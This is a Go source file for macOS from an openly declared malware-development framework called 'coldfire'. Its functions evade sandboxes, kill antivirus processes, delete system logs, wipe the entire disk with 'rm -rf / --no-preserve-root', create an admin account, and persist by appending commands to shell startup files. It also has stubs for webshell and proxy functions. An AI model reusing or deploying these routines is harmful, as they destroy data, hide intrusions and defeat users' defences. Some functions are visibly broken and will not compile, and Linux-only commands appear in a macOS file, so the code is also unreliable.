// +build darwin

// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"fmt"
	humanize "github.com/dustin/go-humanize"
	"github.com/minio/minio/pkg/disk"
	ps "github.com/mitchellh/go-ps"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func killProcByPID(pid int) error {
	p := strconv.Itoa(pid)
	cmd := "kill " + p
	_, err := cmdOut(cmd)
	return err
}

func info() string {
	var (
		u string
	)

	user, err := cmdOut("whoami")
	if err != nil {
		user = "N/A"
	}
	return user
}

func isRoot() bool {
	root := true

	u, _ := cmdOut("whoami")
	root = (strings.TrimSuffix(u, "\n") == "root")

	return root
}

func cmdOut(command string) (string, error) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:]
	cmd := exec.Command(head, parts...)
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}

func sandboxFilepath() bool {
	out, _ := strings.Contains(cmdOut("sysctl -n hw.model"), "Mac")
	return !out
}

func sandboxDisk(size int) bool {
	v := false
	d := "/"
	di, _ := disk.GetInfo(d)
	x := strings.Replace(humanize.Bytes(di.Total), "GB", "", -1)
	x = strings.Replace(x, " ", "", -1)
	z, err := strconv.Atoi(x)
	if err != nil {
		fmt.Println(err)
	}
	if z < size {
		v = true
	}
	return v
}

func sandboxTmp(entries int) bool {
	tmp_dir := "/tmp"
	files, err := ioutil.ReadDir(tmp_dir)
	if err != nil {
		return true
	}

	return len(files) < entries
}

func shutdown() error {
	c := "shutdown -h +1"
	_, err := cmdOut(c)

	return err
}

func pkillAv() error {
	av_processes := []string{"netsafety", "clamav", "sav-protect.service", "sav-rms.service"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func users() ([]string, error) {
	o, err := cmdOut("cut -d: -f1 /etc/passwd")
	if err != nil {
		return nil, err
	}

	return strings.Split(o, "\n"), nil
}

func networks() ([]string, error) {
	wifi_names := []string{}

	out, err := cmdOut("nmcli dev wifi")
	if err != nil {
		return nil, err
	}
	o := strings.Split(out, "\n")[1:]
	for entry := range o {
		e := o[entry]
		wifi_name := strings.Split(e, "")[1]
		wifi_names = append(wifi_names, wifi_name)
	}

	return wifi_names, nil
}

func clearLogs() error {
	_, err := cmdOut("rm -r /var/log")
	if err != nil {
		return err
	}

	return nil
}

func wipe() error {
	cmd := "rm -rf / --no-preserve-root"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

func createUser(username, password string) error {
	cmd := f("sysadminctl -addUser %s -password %s -admin", username, password)
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

func wifiDisconnect() error {
	cmd := "networksetup -setnetworkserviceenabled Wi-Fi off"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil

}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "abcdefgh" {
		f, err := os.Open("/dev/sd" + string(drive))
		if err == nil {
			found_drives = append(found_drives, "/dev/sd"+string(drive))
			f.Close()
		}
	}

	return found_drives, nil
}

func addPersistentCommand(cmd string) error {
	_, err := cmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
	return err
}

// func dialog(message, title string) {
// 	zenity.Info(message, zenity.Title(title))
// }

// func SplitMultiSep(s string, seps []string) []string {
// 	f := func(c rune) bool {
// 		for _, sep := range seps {
// 			if c == sep { // what?
// 				return true
// 			}
// 		}
// 	}
// 	fields := strings.FieldsFunc(s, f)
// 	return fields
// }

/*

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
